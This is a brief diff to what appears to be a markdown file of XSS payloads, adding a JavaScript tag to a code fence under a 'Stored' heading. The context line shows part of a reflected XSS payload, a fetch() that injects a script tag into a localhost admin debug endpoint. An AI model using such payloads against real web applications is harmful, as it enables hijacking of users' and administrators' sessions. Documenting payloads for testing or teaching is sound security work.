@@ -24,7 +24,7 @@ fetch("http://localhost:7149/admin/debug-test?DebugTest=<script>" + encodeURICom
 ```
 
 # XSS Payload (Stored)
-```
+```JavaScript
 <!DOCTYPE html>
 <html>
   <head>
